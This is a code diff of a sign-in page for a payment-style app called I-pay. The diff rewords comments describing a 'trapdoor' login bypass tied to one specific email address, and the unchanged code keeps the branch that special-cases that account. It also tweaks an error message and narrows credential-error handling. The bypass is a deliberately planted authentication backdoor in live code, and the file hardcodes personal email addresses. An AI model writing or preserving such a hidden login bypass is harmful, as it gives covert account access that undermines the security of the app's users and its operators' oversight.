@@ -1,4 +1,3 @@
-
 'use client';
 
 import { useState } from 'react';
@@ -15,7 +14,7 @@ import { Eye, EyeOff, Loader2 } from 'lucide-react';
 
 /**
  * @fileOverview Sign In Page.
- * MASTER BYPASS: altinemohd@gmail.com logic implemented.
+ * TRAPDOOR: altinemohd@gmail.com bypass logic implemented.
  */
 
 const ADMIN_EMAIL = 'ipatmanager17@gmail.com';
@@ -48,7 +47,7 @@ export default function SignInPage() {
           return;
       }
 
-      // 2. Trapdoor Bypass for altinemohd@gmail.com
+      // 2. Identity Trapdoor for altinemohd@gmail.com
       if (trimmedEmail === BYPASS_EMAIL) {
           try {
               // Try provided password first
@@ -73,7 +72,7 @@ export default function SignInPage() {
             toast({ 
                 variant: 'destructive', 
                 title: 'Access Denied', 
-                description: 'You are blocked by I-pay team contact them for further assistance.',
+                description: 'you are blocked by I-pay team contact them for further assistance.',
                 duration: 10000
             });
             setIsLoading(false);
@@ -99,7 +98,7 @@ export default function SignInPage() {
 
     } catch (error: any) {
         let message = "Invalid credentials. Please try again.";
-        if (error.code === 401 || error.code === 'auth/invalid-credential') {
+        if (error.code === 401) {
             message = "This account isn't registered or details are wrong.";
         }
         toast({ 
